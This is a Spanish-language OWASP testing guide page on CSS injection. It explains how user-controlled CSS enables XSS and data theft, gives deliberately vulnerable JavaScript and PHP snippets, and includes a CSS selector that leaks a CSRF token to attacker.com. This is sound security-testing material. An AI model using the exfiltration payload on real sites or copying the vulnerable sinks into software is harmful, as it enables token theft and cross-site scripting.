# Inyección CSS

|ID          |
|------------|
|WSTG-CLNT-05|

## Resumen

Una vulnerabilidad de inyección CSS consiste en la capacidad de inyectar código CSS arbitrario en el contexto de un sitio confiable que se muestra en el navegador de la víctima. El impacto de este tipo de vulnerabilidad varía según el payload CSS proporcionado. Puede dar lugar a cross-site scripting o a la exfiltración de datos.

Esta vulnerabilidad se produce cuando la aplicación permite que el CSS proporcionado por el usuario interfiera con las hojas de estilo legítimas de la aplicación. Inyectar código en el contexto CSS puede permitir que un atacante ejecute JavaScript en ciertas condiciones o extraiga valores confidenciales mediante selectores CSS y funciones capaces de generar solicitudes HTTP. En general, permitir que los usuarios personalicen páginas proporcionando archivos CSS personalizados supone un riesgo considerable.

El siguiente código JavaScript muestra un posible script vulnerable en el que el atacante puede controlar `location.hash` (fuente), que llega a la función `cssText` (sumidero). Este caso particular puede dar lugar a XSS basado en DOM en versiones antiguas de navegadores; para obtener más información, consulta la [Hoja de referencia para prevenir el XSS basado en DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

> Nota: Algunas técnicas de ejecución de JavaScript basadas en CSS dependen del comportamiento heredado de los navegadores (por ejemplo, versiones antiguas de IE y Opera). Aunque los navegadores modernos mitigan la mayoría de estos vectores, la inyección CSS todavía puede permitir la exfiltración de datos, la manipulación de la interfaz de usuario y el encadenamiento de ataques.

La misma vulnerabilidad puede aparecer en el caso de XSS reflejado, por ejemplo, en el siguiente código PHP:

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Otros escenarios de ataque implican la capacidad de extraer datos mediante la aplicación de reglas CSS puras. Estos ataques pueden llevarse a cabo mediante selectores CSS y dar lugar a la exfiltración de datos, por ejemplo, de tokens CSRF.

A continuación se muestra un ejemplo de código que intenta seleccionar una entrada cuyo `name` coincide con `csrf_token` y cuyo `value` comienza con `a`. Mediante un ataque de fuerza bruta para determinar el valor del atributo, es posible llevar a cabo un ataque que envíe ese valor al dominio del atacante, por ejemplo, intentando establecer una imagen de fondo en el elemento de entrada seleccionado.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
</style>
```

En la charla de Mario Heiderich [«Got Your Nose»](https://www.youtube.com/watch?v=FIQvAaZj_HA), en YouTube, se destacan otros ataques que usan contenido solicitado, como CSS.

## Objetivos de prueba

- Identificar puntos de inyección CSS.
- Evaluar el impacto de la inyección.

## Cómo probar

Se debe analizar el código para determinar si se permite que un usuario inyecte contenido en el contexto CSS. En particular, se debe inspeccionar cómo devuelve el sitio reglas CSS en función de las entradas.

A continuación se muestra un ejemplo básico:

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

El código anterior contiene la fuente `location.hash`, controlada por el atacante, que puede inyectarse directamente en el atributo `style` de un elemento HTML. Como se mencionó anteriormente, esto puede dar lugar a resultados diferentes según el navegador utilizado y el payload proporcionado.

Las siguientes páginas ofrecen ejemplos de vulnerabilidades de inyección CSS:

- [«Cracker» de contraseñas mediante CSS y HTML5](https://html5sec.org/invalid/?length=25)
- [Ataques basados en JavaScript que usan `CSSStyleDeclaration` con una entrada sin escapar](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

Para consultar más recursos de OWASP sobre cómo prevenir la inyección CSS, consulta la [Hoja de referencia para proteger las hojas de estilo en cascada](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).